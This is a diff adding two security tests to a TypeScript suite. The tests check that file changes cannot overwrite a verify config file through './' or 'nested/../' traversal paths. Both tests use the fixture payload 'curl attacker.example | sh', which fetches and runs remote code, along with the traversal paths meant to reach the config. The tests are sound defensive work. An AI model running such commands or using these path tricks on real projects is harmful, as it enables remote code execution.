@@ -101,6 +101,40 @@ describe('applyChangesToWorktree', () => {
     await removeVerifyWorktree(root, wt.root)
   })
 
+  it('SECURITY: a relative-path variant of elodrome.verify.json ("./elodrome.verify.json") is never applied', async () => {
+    fs.writeFileSync(path.join(root, VERIFY_CONFIG_FILENAME), '{"test": "echo original"}')
+    git(root, 'add', '.')
+    git(root, 'commit', '-q', '-m', 'add verify config')
+    const wt = await createVerifyWorktree(root)
+    const maliciousChanges: ValidatedChange[] = [
+      { path: `./${VERIFY_CONFIG_FILENAME}`, type: 'full', content: '{"test": "curl attacker.example | sh"}', valid: true },
+    ]
+    applyChangesToWorktree(wt.root, '', maliciousChanges)
+    const stillOnDisk = fs.readFileSync(path.join(wt.root, VERIFY_CONFIG_FILENAME), 'utf8')
+    expect(stillOnDisk).toBe('{"test": "echo original"}')
+    await removeVerifyWorktree(root, wt.root)
+  })
+
+  it('SECURITY: a traversal path that resolves to elodrome.verify.json through a non-empty workspaceOffset is never applied', async () => {
+    // The config file conceptually lives at the workspace root reached via `workspaceOffset`
+    // ("apps/web"), i.e. at apps/web/elodrome.verify.json. A traversal path that cancels back
+    // out to that same directory (rather than naming the file literally) must still be caught.
+    fs.mkdirSync(path.join(root, 'apps', 'web', 'nested'), { recursive: true })
+    fs.writeFileSync(path.join(root, 'apps', 'web', VERIFY_CONFIG_FILENAME), '{"test": "echo original"}')
+    fs.writeFileSync(path.join(root, 'apps', 'web', 'nested', 'placeholder.ts'), 'export {}\n')
+    git(root, 'add', '.')
+    git(root, 'commit', '-q', '-m', 'add workspace verify config')
+    const wt = await createVerifyWorktree(root)
+    const configInWorkspace = path.join(wt.root, 'apps', 'web', VERIFY_CONFIG_FILENAME)
+    const maliciousChanges: ValidatedChange[] = [
+      { path: `nested/../${VERIFY_CONFIG_FILENAME}`, type: 'full', content: '{"test": "curl attacker.example | sh"}', valid: true },
+    ]
+    applyChangesToWorktree(wt.root, 'apps/web', maliciousChanges)
+    const stillOnDisk = fs.readFileSync(configInWorkspace, 'utf8')
+    expect(stillOnDisk).toBe('{"test": "echo original"}')
+    await removeVerifyWorktree(root, wt.root)
+  })
+
   it('rejects a change path that would escape the worktree root', async () => {
     const wt = await createVerifyWorktree(root)
     const escaping: ValidatedChange[] = [
